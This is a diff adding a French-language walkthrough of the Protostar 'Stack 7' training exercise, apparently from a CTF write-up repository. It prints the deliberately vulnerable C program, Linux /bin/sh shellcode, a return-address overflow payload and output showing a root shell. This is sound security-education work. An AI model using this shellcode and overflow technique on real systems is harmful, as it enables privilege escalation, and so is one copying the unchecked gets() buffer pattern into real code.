@@ -398,6 +398,63 @@ python -c 'print "A"*80 + "\x08\x04\x84\xf9"[::-1] + "\xff\xe0\x51\xf4"[::-1] + 
 ./stack6 < /tmp/file
 ```
 
-# Stack 7#
+# Stack 7 #
 
-bientôt ...
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+char *getpath()
+{
+  char buffer[64];
+  unsigned int ret;
+
+  printf("input path please: "); fflush(stdout);
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+
+  if((ret & 0xb0000000) == 0xb0000000) {
+      printf("bzzzt (%p)\n", ret);
+      _exit(1);
+  }
+
+  printf("got path %s\n", buffer);
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv)
+{
+  getpath();
+}
+
+```
+
+C'est à peu de chose près la même chose que le code précédent.
+
+Le contrôle d'EIP se fait après 80 octets.
+
+J'utilise l'instruction ret à la même adresse que stack6.
+
+Une variable d'environnement va être utilisée pour stocker le shellcode.
+
+```bash
+export SHELLCODE=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+
+Puis obtentions de l'adresse
+
+/tmp/getenv SHELLCODE ./stack7
+SHELLCODE will be at 0xbffff97b
+```
+
+```bash
+python -c 'print "A"*80 + "\x08\x04\x85\xf9"[::-1] + "\xbf\xff\xf9\x7b"[::-1]' > /tmp/file
+
+./stack7 < /tmp/file
+input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{���
+# id
+uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
+```
